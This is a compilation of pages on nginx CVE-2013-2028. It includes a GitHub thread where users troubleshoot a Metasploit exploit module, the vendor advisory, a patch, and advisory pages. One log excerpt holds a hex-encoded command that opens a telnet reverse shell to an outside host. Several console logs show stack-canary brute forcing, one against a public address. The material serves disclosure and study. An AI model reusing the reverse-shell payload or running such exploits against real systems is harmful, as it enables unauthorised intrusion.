| [@saelo](https://github.com/saelo) [@jvazquez-r7](https://github.com/jvazquez-r7) Hi, I'm trying to reproduce the vulnerability recently. However, neither in centOS(6.8-32bit) or ubuntu(16.04-32bit) does it work.  The following expriment is on Ubuntu 16.04-32bit Here is what I do from a scratch(I'm running as root, and the IP of ubuntu server is *192.168.193.146*):  ./configure make make install  I start nginx using `/usr/local/nginx/sbin/nginx` Then I start msf in another PC running windows 7(whose IP is *192.168.193.134*), and when I run, I get the following message:  [*] Started reverse TCP double handler on 192.168.193.134:4444 [*] 192.168.193.146:80 - Searching for stack canary [*] 192.168.193.146:80 - Assuming byte 0 0x00 [*] 192.168.193.146:80 - Bruteforcing byte 1 [-] 192.168.193.146:80 - Exploit failed: Errno::ECONNRESET An existing connectio n was forcibly closed by the remote host. [\*] Exploit completed, but no session was created.  It seems that nginx is rejecting the connection. I am sure I have disabled the firewall and `wget 127.0.0.1/test.php` was successful.  Actually, if I test this [DoS\_poc](http://www.exploit-db.com/download/25499), I get **`405 not allowed`**, which, as I see it, is very likely to be the problem of the configuration of nginx.  Did you do any modification(maybe a subtle one) to the configuration during the install process? Because I can't reproduce it both in Ubuntu and CentOS, and I have no idea about it.  BTW, I have already installed libpcre++-devand zlib1g-dev using `apt install`.  Thanks. |
| --- |

All reactions

Sorry, something went wrong.

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=80&v=4)](/hal3002)

Copy link

Contributor

Author

### **[hal3002](/hal3002)** commented [Aug 16, 2016](#issuecomment-240126435)

| What version of nginx are you attempting to run this on? |
| --- |

All reactions

Sorry, something went wrong.

[![@targetnull](https://avatars.githubusercontent.com/u/7612103?s=80&v=4)](/targetnull)

Copy link

### **[targetnull](/targetnull)** commented [Aug 16, 2016](#issuecomment-240155938) • edited Loading

| It's 1.4.0, I downloaded from [exploit-db](http://www.exploit-db.com/wp-content/themes/exploit/applications/d496e58864ab10ed56278b7655b0d0b2-nginx-1.4.0.tar.gz)  And the dos\_poc.c is from [this link of exploit-db](https://www.exploit-db.com/exploits/25499/). |
| --- |

All reactions

Sorry, something went wrong.

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=80&v=4)](/hal3002)

Copy link

Contributor

Author

### **[hal3002](/hal3002)** commented [Aug 16, 2016](#issuecomment-240160211)

| It could be a number of issues. As you said, it could be a configuration issue but I have no idea what that would be. I think more likely, it's either your compiled version wasn't built with stack canaries or the offset to the stack canary is different than your chosen target. If you include a stack trace it might be more obvious what the issue is. In either case, the ROP chains defined in the metasploit module will more than likely not work for you and you will need to find their equivalent gadgets on your system. |
| --- |

All reactions

Sorry, something went wrong.

[![@targetnull](https://avatars.githubusercontent.com/u/7612103?s=80&v=4)](/targetnull)

Copy link

### **[targetnull](/targetnull)** commented [Aug 16, 2016](#issuecomment-240166614) • edited Loading

| At first, I doubt a problem of the address of gadgets, but I find out that when I run `dos_poc.py`, it got stuck after a `405 not allowed`.  To be more precise, the script will try 5 times by default, and the first try will get the response of `405 not allowed`, but from the second try, it just got stuck at  Http request sent, awaiting response...  (P.S., it causes an timeout exception in the script, so I test it manually using wget and find it stuck here)  After that, any connection to nginx will get stuck at the same place, no matter using wget or curl.  If it is the problem of the address, I think it should cause a crash rather than just get stuck. However, I'm not familiar with nginx, is this the expected response? |
| --- |

All reactions

Sorry, something went wrong.

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=80&v=4)](/hal3002)

Copy link

Contributor

Author

### **[hal3002](/hal3002)** commented [Aug 16, 2016](#issuecomment-240170985)

| So unfortunately, I have no idea what your dos\_poc.py is trying to do but from your error previously: "[-] 192.168.193.146:80 - Exploit failed: Errno::ECONNRESET An existing connectio n was forcibly closed by the remote host."  That seems that the connection with reset implying that the application did crash. Keep in mind, that without a debugger following the handling forked PID, you will not see any difference as nginx is forking to handle connections. It will appear as if nginx closed the connection but since it is not returning any kind of HTTP error code and resetting the connection I would assume that you are actually crashing the application. |
| --- |

All reactions

Sorry, something went wrong.

[![@targetnull](https://avatars.githubusercontent.com/u/7612103?s=80&v=4)](/targetnull)

Copy link

### **[targetnull](/targetnull)** commented [Aug 16, 2016](#issuecomment-240179254)

| That sounds reasonable. I'll modify the address and try again.  Thanks a lot. |
| --- |

All reactions

Sorry, something went wrong.

[![@btroksa](https://avatars.githubusercontent.com/u/25758968?s=80&u=07e6d87cb7efbe002288252ccd14ed547502096a&v=4)](/btroksa)

Copy link

### **[btroksa](/btroksa)** commented [Jul 25, 2017](#issuecomment-317826886)

| Steps to reproduce How'd you do it?   1. ... Starting Nginx 1.4.0 2. ... Running the nginx\_chunked\_size exploit via metasploit   This section should also tell us any relevant information about the environment; for example, if an exploit that used to work is failing, tell us the victim operating system and service versions. Expected behavior What should happen? I expect the exploit to find the stack canary and override it then proceed with the exploit. However, the exploit just searches for the canary bytes and is unable to find them and crashes.  You might also want to check the last ~1k lines of `/opt/metasploit/apps/pro/engine/config/logs/framework.log` or `~/.msf4/logs/framework.log` for relevant stack traces  The framework.log displays the following:  [07/20/2017 17:09:45] [w(0)] core: /usr/src/metasploit-framework/modules/exploits/linux/http/nginx\_chunked\_size\_no\_brute.rb generated a warning during load: Please change the modules class name from Metasploit4 to MetasploitModule [07/20/2017 17:09:47] [e(0)] core: Unable to load module /usr/src/metasploit-framework/modules/exploits/linux/smtp/haraka.py Errno::EPIPE Broken pipe [07/20/2017 17:10:29] [d(0)] core: Echo Command Encoder result: /bin/echo -ne '\x73\x68\x20\x2d\x63\x20\x27\x28\x73\x6c\x65\x65\x70\x20\x33\x36\x34\x33\x7c\x74\x65\x6c\x6e\x65\x74\x20\x31\x37\x32\x2e\x31\x38\x2e\x30\x2e\x33\x20\x34\x34\x34\x34\x7c\x77\x68\x69\x6c\x65\x20\x3a\x20\x3b\x20\x64\x6f\x20\x73\x68\x20\x26\x26\x20\x62\x72\x65\x61\x6b\x3b\x20\x64\x6f\x6e\x65\x20\x32\x3e\x26\x31\x7c\x74\x65\x6c\x6e\x65\x74\x20\x31\x37\x32\x2e\x31\x38\x2e\x30\x2e\x33\x20\x34\x34\x34\x34\x20\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x20\x26\x29\x27'|sh  Edit: Would there be a way to determine the stack canary without Brute Forcing it? This is what I am seeing:  [*] 10.222.10.51:8806 - Searching for stack canary [*] 10.222.10.51:8806 - Assuming byte 0 0x00 [*] 10.222.10.51:8806 - Bruteforcing byte 1 [+] 10.222.10.51:8806 - Byte 1 found: 0x00 [*] 10.222.10.51:8806 - Bruteforcing byte 2 [+] 10.222.10.51:8806 - Byte 2 found: 0x00 [*] 10.222.10.51:8806 - Bruteforcing byte 3 [+] 10.222.10.51:8806 - Byte 3 found: 0x00 [-] 10.222.10.51:8806 - Exploit aborted due to failure: unknown: - Unable to find stack canary [*] Exploit completed, but no session was created.  It seems the brute forcing of the stack canary is not working for some reason.  Does someone have the steps they took to set this up and produce the correct results? |
| --- |

All reactions

Sorry, something went wrong.

[![@shan9zt](https://avatars.githubusercontent.com/u/24619810?s=80&v=4)](/shan9zt)

Copy link

### **[shan9zt](/shan9zt)** commented [Mar 12, 2019](#issuecomment-472225125)

| Hi I am experiencing the same problem as previous guys. I am pretty sure that I have install all the library when I compiled nginx 1.4.0 from exploitdb website. And I am running the exploit on Ubuntu 13.04 32 bit. Here is the result I get:  msf5 exploit(linux/http/nginx\_chunked\_size) > show options  Module options (exploit/linux/http/nginx\_chunked\_size):  Name Current Setting Required Description   ---   RHOSTS 0.0.0.0 yes The target address range or CIDR identifier RPORT 8080 yes The remote HTTP server port (TCP)  Payload options (cmd/unix/bind\_netcat):  Name Current Setting Required Description   ---   LPORT 4444 yes The listen port RHOST 0.0.0.0 no The target address  Exploit target:  Id Name   ---   0 Ubuntu 13.04 32bit - nginx 1.4.0  msf5 exploit(linux/http/nginx\_chunked\_size) > check [*] 0.0.0.0:8080 - The target appears to be vulnerable. msf5 exploit(linux/http/nginx\_chunked\_size) > rexploit [*] Reloading module...  [*] 0.0.0.0:8080 - Searching for stack canary [*] 0.0.0.0:8080 - Assuming byte 0 0x00 [*] 0.0.0.0:8080 - Bruteforcing byte 1 [+] 0.0.0.0:8080 - Byte 1 found: 0xd7 [*] 0.0.0.0:8080 - Bruteforcing byte 2 [+] 0.0.0.0:8080 - Byte 2 found: 0x15 [\*] 0.0.0.0:8080 - Bruteforcing byte 3 [+] 0.0.0.0:8080 - Byte 3 found: 0xa0 [+] 0.0.0.0:8080 - Canary found: 0xa015d700  [*] Started bind TCP handler against 0.0.0.0:4444 [*] Exploit completed, but no session was created. msf5 exploit(linux/http/nginx\_chunked\_size) >  The exploit seems stopped after brute force the stack canary. Any help would be really appreciated. [@saelo](https://github.com/saelo) |
| --- |

All reactions

Sorry, something went wrong.

[![@therohitsingh](https://avatars.githubusercontent.com/u/51639630?s=80&u=3f89d6445328cab3bc224057116996a94072f8b4&v=4)](/therohitsingh)

Copy link

### **[therohitsingh](/therohitsingh)** commented [May 13, 2020](#issuecomment-627727954)

| i am also having the same issue as the one above :-  msf5 exploit(linux/http/nginx\_chunked\_size) > rexploit [\*] Reloading module...  [*] Started reverse TCP double handler on 192.168.1.105:4444 [*] 185.27.134.252:80 - Searching for stack canary [*] 185.27.134.252:80 - Assuming byte 0 0x00 [*] 185.27.134.252:80 - Brute forcing byte 1 [+] 185.27.134.252:80 - Byte 1 found: 0x00 [*] 185.27.134.252:80 - Brute forcing byte 2 [+] 185.27.134.252:80 - Byte 2 found: 0x00 [*] 185.27.134.252:80 - Brute forcing byte 3 [+] 185.27.134.252:80 - Byte 3 found: 0x00 [-] 185.27.134.252:80 - Exploit aborted due to failure: unknown: 185.27.134.252:80 - Unable to find stack canary [\*] Exploit completed, but no session was created. |
| --- |

All reactions

Sorry, something went wrong.

[![@bcoles](https://avatars.githubusercontent.com/u/434827?s=40&v=4)](/bcoles)
[bcoles](/bcoles)
mentioned this pull request
[Jul 5, 2022](#ref-issue-1234550275)

[The The ngx\_http\_parse\_chunked for ubuntu 13.04
#16568](/rapid7/metasploit-framework/issues/16568)

Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F1834)

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

10 participants

[![@hal3002](https://avatars.githubusercontent.com/u/82838?s=52&v=4)](/hal3002) [![@saelo](https://avatars.githubusercontent.com/u/2453290?s=52&v=4)](/saelo) [![@jvazquez-r7](https://avatars.githubusercontent.com/u/1742838?s=52&v=4)](/jvazquez-r7) [![@danghvu](https://avatars.githubusercontent.com/u/1152714?s=52&v=4)](/danghvu) [![@niubl](https://avatars.githubusercontent.com/u/4416142?s=52&v=4)](/niubl) [![@inode-](https://avatars.githubusercontent.com/u/4608466?s=52&v=4)](/inode-) [![@targetnull](https://avatars.githubusercontent.com/u/7612103?s=52&v=4)](/targetnull) [![@btroksa](https://avatars.githubusercontent.com/u/25758968?s=52&v=4)](/btroksa) [![@shan9zt](https://avatars.githubusercontent.com/u/24619810?s=52&v=4)](/shan9zt) [![@therohitsingh](https://avatars.githubusercontent.com/u/51639630?s=52&v=4)](/therohitsingh)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from mailman.nginx.org_37c53407_20250125_014414.html ===

# [nginx-announce] nginx security advisory (CVE-2013-2028)

**Maxim Dounin**
mdounin at mdounin.ru

*Tue May 7 11:30:26 UTC 2013*

* Previous message: [[nginx-announce] nginx-1.4.1](000111.html)
* Next message: [[nginx-announce] nginx-1.2.9](000113.html)
* **Messages sorted by:**
  [[ date ]](date.html#112)
  [[ thread ]](thread.html#112)
  [[ subject ]](subject.html#112)
  [[ author ]](author.html#112)

---

```
Hello!

Greg MacManus, of iSIGHT Partners Labs, found a security problem
in several recent versions of nginx.  A stack-based buffer
overflow might occur in a worker process while handling a
specially crafted request, potentially resulting in arbitrary code
execution (CVE-2013-2028).

The problem affects nginx 1.3.9 - 1.4.0.

The problem is fixed in nginx 1.5.0, 1.4.1.

Patch for the problem can be found here:

<http://nginx.org/download/patch.2013.chunked.txt>

As a temporary workaround the following configuration
can be used in each server{} block:

    if ($http_transfer_encoding ~* chunked) {
        return 444;
    }

--
Maxim Dounin
<http://nginx.org/en/donation.html>

```

---

* Previous message: [[nginx-announce] nginx-1.4.1](000111.html)
* Next message: [[nginx-announce] nginx-1.2.9](000113.html)
* **Messages sorted by:**
  [[ date ]](date.html#112)
  [[ thread ]](thread.html#112)
  [[ subject ]](subject.html#112)
  [[ author ]](author.html#112)

---

[More information about the nginx-announce
mailing list](http://mailman.nginx.org/mailman/listinfo/nginx-announce)



=== Content from nginx.org_13da6e43_20250125_014414.html ===
--- src/http/ngx\_http\_parse.c
+++ src/http/ngx\_http\_parse.c
@@ -2209,6 +2209,10 @@ data:
}
+ if (ctx->size < 0 || ctx->length < 0) {
+ goto invalid;
+ }
+
return rc;
done:


=== Content from secunia.com_c7667781_20250125_014420.html ===


[Skip to main content](#main-content)
[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

Search

## Main navigation

* Solutions
  + Column 1
    - Business challenge
      * [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
      * [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
      * [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
      * [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
      * [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
      * [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
      * [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
      * [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
      * [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
      * [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
      * [Public sector](https://www.flexera.com/solutions/public-sector)
  + Column 2
    - Spend management by vendor
      * [IBM](https://www.flexera.com/solutions/vendor/ibm)
      * [Oracle](https://www.flexera.com/solutions/vendor/oracle)
      * [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
      * [SAP](https://www.flexera.com/solutions/vendor/sap)
      * [VMware](https://www.flexera.com/solutions/vendor/vmware)
      * [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
      * [AWS](https://www.flexera.com/solutions/vendor/aws)
      * [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
      * [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
      * [Adobe](https://www.flexera.com/solutions/vendor/adobe)

  ### Achieve more through a united FinOps and ITAM function

  The future is hybrid. Break down the walls between ITAM and FinOps to drive more revenue, more customer growth and more innovation.

  [Discover More](https://www.flexera.com/resources/hybrid-itam-finops)
* Products
  + Column 1
    - [Flexera One](https://www.flexera.com/products/flexera-one)
      * [IT Visibility](https://www.flexera.com/products/flexera-one/it-visibility)
      * [ITAM](https://www.flexera.com/products/flexera-one/it-asset-management)
      * [SaaS Management](https://www.flexera.com/products/flexera-one/saas-management)
      * [FinOps](https://www.flexera.com/products/flexera-one/finops)
      * [Technology Intelligence Platform](https://www.flexera.com/products/flexera-one/technology-intelligence-platform)
  + Column 2
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
      * [Snow Spend Optimizer](https://www.flexera.com/products/snow-atlas/snow-spend-optimizer)
      * [Snow SaaS Management](https://www.flexera.com/products/snow-atlas/snow-saas-management)
  + Column 3
    - Hide group
      * [Security](https://www.flexera.com/products/security)
      * [Application Readiness](https://www.flexera.com/products/adminstudio)
      * [All products](https://www.flexera.com/products)
      * [All Snow products](https://www.flexera.com/products/snow)
      * [Integrations](https://www.flexera.com/products/integrations)

  ### Flexera 2024 State of the Cloud Report

  What do transformative initiatives such as GenAI, machine learning and sustainability mean for the cloud? Check out the 2024 State of the Cloud Report to find the answer as well as all the latest cloud computing trends.

  [View Report](https://info.flexera.com/CM-REPORT-State-of-the-Cloud)
* Success
  + Column 1
    - [Customer success](https://www.flexera.com/customer-success)
      * Support
        + [Flexera support portal](https://community.flexera.com/s/support-hub)
        + [Flexera product documentation](https://docs.flexera.com)
        + [Snow product documentation](https://docs.snowsoftware.io/)
      * Services and training
        + [Services](https://www.flexera.com/customer-success/services)
        + [Training](https://www.flexera.com/customer-success/training)
  + Column 2
    - Hide group
      * [Technology Intelligence Awards](https://www.flexera.com/customer-success/awards)
      * [Flexera community](https://community.flexera.com/s/)

  ### Insights from Gartner®

  Find a curated series of actionable and objective insights for IT executives and their teams. Get expert insights from valued analysts, courtesy of Flexera.

  [Discover More](https://www.flexera.com/resources/gartner-analyst-research)
* Resources
  + Column 1
    - [Resources](https://www.flexera.com/resources)
      * [Webinars](https://www.flexera.com/resources?type%5Bwebinar%5D=webinar)
      * [Videos](https://www.flexera.com/resources?type%5Bvideo%5D=video)
      * [Datasheets](https://www.flexera.com/resources?type%5Bdatasheet%5D=datasheet)
      * [White papers & reports](https://www.flexera.com/resources?type%5Bwhite-paper-industry-report%5D=white-paper-industry-report)
  + Column 2
    - Hide group
      * [Blog](/blog/)
      * [Case studies](https://www.flexera.com/resources/case-studies)
      * [Events](https://www.flexera.com/resources?type%5Bevent%5D=event)
      * [Analyst Research](https://www.flexera.com/resources/gartner-analyst-research)
      * [Glossary](https://www.flexera.com/resources/glossary)
      * [Demos & trials](https://www.flexera.com/resources?type%5Bdemo-trials%5D=demo-trials)
      * [Business value calculator](https://www.flexera.com/resources/business-value-calculator)

  ### Flexera 2025 IT Priorities Report

  Insights from Flexera’s 2025 IT Priorities Report highlight what’s top of mind for IT decision makers in the year ahead. Discover the challenges, priorities and opportunities that will shape the future IT landscape.

  [View Report](https://info.flexera.com/ITV-REPORT-IT-Priorities)
* About
  + Column 1
    - [Company](https://www.flexera.com/about-us)
      * [About](https://www.flexera.com/about-us)
      * [Careers](https://www.flexera.com/about-us/careers)
      * [Contact](https://www.flexera.com/about-us/contact-us)
      * [Leadership](https://www.flexera.com/about-us/leadership)
    - [Partners](https://www.flexera.com/about-us/partners)
      * [Partner program](https://www.flexera.com/about-us/partners/partner-program)
      * [Partner directory](https://www.flexera.com/about-us/partners/directory)
  + Column 2
    - [Press center](https://www.flexera.com/about-us/press-center)
      * [Press releases](https://www.flexera.com/about-us/all-press-releases)
      * [Awards](https://www.flexera.com/about-us/press-center#awards)
      * [Articles](https://www.flexera.com/about-us/all-articles)
    - Hide group
      * Social responsibility
        + [ESG](https://www.flexera.com/about-us/environmental-social-governance)
        + [Diversity](https://www.flexera.com/about-us/diversity)

  ### More value with technology intelligence

  The unparalleled synergy of Flexera and Snow provides the Technology Intelligence you need for more efficiency, insight and governance than ever before.

  [Discover More](https://www.flexera.com/more-value-with-technology-intelligence)

Search

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

## External Links

* External Links
  + [Community](https://community.flexera.com/)
  + [Product Access](https://app.flexera.com/login)
  + [Partner Portal](https://flexera.channeltivity.com/Login)

[Book a demo](/about-us/contact-us?C_Interest1=sales)

# Secunia Research

## The world’s best vulnerability intelligence

The Secunia Research team from Flexera provides the most accurate and reliable source of vulnerability intelligence.

[Contact Us](https://www.flexera.com/about-us/contact-us?C_Interest1=sales&C_SolutionInterest=SVM)
Watch video (0:29)

Related links

* [Anatomy of a security advisory](https://www.flexera.com/resources/infographics/anatomy-of-a-security-advisory)
* [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)
* [Software Vulnerability Manager](/products/software-vulnerability-manager)
* [Security advisories from Secunia Research](https://www.flexera.com/products/security/software-vulnerability-advisories)
* [Report a vulnerability](https://www.flexera.com/about-us/contact-us/report-vulnerability)

 ![Secunia Research](/sites/default/files/2022-04/hero-secunia-research-bg.jpg)

Featured Details

## Multiple ways to consume Secunia Research

Secunia delivers software security research that provides reliable, curated and actionable vulnerability intelligence. Organizations can expect to receive standardized, validated and enriched vulnerability research on a specific version of a software product. Secunia Research supports four solutions:

![Software Vulnerability Research](/sites/default/files/2022-04/icon-secunia-research-svr.svg)

### [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)

Software Vulnerability Research utilizes Secunia Research to drive awareness of vulnerabilities matching your specified criteria

[Learn More](https://www.flexera.com/products/software-vulnerability-research)

![Software Vulnerability Manager](/sites/default/files/2022-04/icon-secunia-research-svm.svg)

### [Software Vulnerability Manager](/products/software-vulnerability-manager)

Software Vulnerability Manager uses Secunia Research data to identify, prioritize and patch known vulnerable software detected in your environment

[Learn More](/products/software-vulnerability-manager)

![Data Platform](/sites/default/files/2022-04/icon-secunia-research-dp.svg)

### [Data Platform](https://www.flexera.com/products/data-platform)

Data Platform leverages Secunia Research to provide high-level insights based on major or minor versions of software in your normalized inventory

[Learn More](https://www.flexera.com/products/data-platform)

![Flexera One](/sites/default/files/2022-04/icon-secunia-research-flexera-one.svg)

### [Flexera One](/flexera-one)

Flexera One utilizes Secunia Research (alongside public NVD data) to provide more granular matching of build-level versions of software in your normalized inventory within its IT Asset Management and IT Visibility solutions

[Learn More](/flexera-one)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Informing IT, Transforming IT

## Industry insights to help keep you informed

[#### Webinar

### Stay Ahead of Cyber Threats: Flexera's Latest Vulnerability Insights

Join us for this session where we'll explore the latest findings from the Flexera Monthly Vulnerability Insights Report.](https://info.flexera.com/SVM-WBNR-Vulnerability-Insights-Roundtable)

[#### Webinar

### Dive deeper into the Flexera Annual Vulnerability Insights

We'll explore the key findings from the Flexera Annual Vulnerability Insights Report. Learn about the latest cybersecurity trends, the most targeted industries, the types of vulnerabilities, plus management and mitigation strategies.](https://info.flexera.com/SVM-WBNR-Flexera-Annual-Vulnerability-Insights?lead_source=Website%20Visitor&id=Flexera.com-Resources)

#### Video

### Close the Risk Window with Software Vulnerability Manager

Stop reacting. Gain control. Stay secure. Build a more effective risk mitigation process leveraging Secunia Research vulnerability intelligence and the largest repository of third-party patch data in the industry.

Remote video URL

[#### Trial

### Software Vulnerability Manager Assessment free trial

Get access to the complete set of modules of Software Vulnerability Manager: Research, Assessment and Patching](https://info.flexera.com/SVM-EVAL-Software-Vulnerability-Manager)

[#### Datasheet

### Protect your ServiceNow® investment with the highest quality data

IT Visibility offers certified ServiceNow integrations that accelerate platform expansion, improve ROI and increase efficiencies across ITIL processes by delivering clean software and hardware asset data directly.](/sites/default/files/datasheet-itv-maximize-servicenow-investment.pdf)

[#### Blog

### Avoid missing crucial vulnerability intelligence amid NVD backlog

Recent developments regarding the National Vulnerability Database (NVD) have some technology leaders on edge. Since February, the U.S. National Institute of Standards and Technology (NIST) has almost completely stopped enriching software vulnerabi...](https://www.flexera.com/blog/vulnerability-management/avoid-missing-crucial-vulnerability-intelligence-amid-nvd-backlog/)

[View all resources](https://www.flexera.com/resources?category%5Bsoftware-vulnerability-management%5D=software-vulnerability-management)

## Footer Menu

* Column
  + Business challenge
    - [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
    - [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
    - [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
    - [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
    - [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
    - [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
    - [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
    - [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
    - [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
    - [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
    - [Public sector](https://www.flexera.com/solutions/public-sector)
* Column
  + Spend management by vendor
    - [IBM](https://www.flexera.com/solutions/vendor/ibm)
    - [Oracle](https://www.flexera.com/solutions/vendor/oracle)
    - [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
    - [SAP](https://www.flexera.com/solutions/vendor/sap)
    - [VMware](https://www.flexera.com/solutions/vendor/vmware)
    - [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
    - [AWS](https://www.flexera.com/solutions/vendor/aws)
    - [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
    - [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
    - [Adobe](https://www.flexera.com/solutions/vendor/adobe)
* Column
  + Products
    - [Flexera One](https://www.flexera.com/products/flexera-one)
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
    - [Security](https://www.flexera.com/products/security)
    - [Application Readiness](https://www.flexera.com/products/adminstudio)
    - [All products](https://www.flexera.com/products)
    - [All Snow products](https://www.flexera.com/products/snow)
    - [Integrations](https://www.flexera.com/products/integrations)
* Column
  + Company
    - [About](https://www.flexera.com/about-us)
    - [Careers](https://www.flexera.com/about-us/careers)
    - [Leadership](https://www.flexera.com/about-us/leadership)
    - [Contact us](https://www.flexera.com/about-us/contact-us)
    - [Media / press center](https://www.flexera.com/about-us/press-center)
    - [Revenera.com](https://www.revenera.com)

 +1.800.374.4353

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

 [![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

© 2025 Flexera. All Rights Reserved.

## Footer

* [Privacy Policy](https://www.flexera.com/legal/privacy-policy)
* [Terms and conditions](https://www.flexera.com/legal)
* [Contact Us](https://www.flexera.com/about-us/contact-us)
* [Impressum](https://www.flexera.com/about-us/impressum)
* [Site Map](https://www.flexera.com/sitemap)

#####

×

...



=== Content from www.vnsecurity.net_2cc2475d_20250125_014423.html ===

## Please enable javascript on your browser to continue.

Protected by Polaris
# Checking your browser

### `Request id:ckjcgqrtv8qqb00fscgg0e7g4cpjv7lduookkad2sa9hg0`This process is automatic. You will be redirected to your destination shortly.This may take up to 10 seconds.

![](/polaris-resources/images/loading.gif)Protected by Polaris

=== Content from security.gentoo.org_1af2429e_20250125_014421.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# nginx: Multiple vulnerabilities — GLSA **201310-04**

Multiple vulnerabilities have been found in nginx, the worst of
which may allow execution of arbitrary code.

### Affected packages

| Package | **www-servers/nginx** on all architectures |
| --- | --- |
| Affected versions | < **1.4.1-r2** |
| Unaffected versions | >= **1.4.1-r2** |

### Background

nginx is a robust, small, and high performance HTTP and reverse proxy
server.

### Description

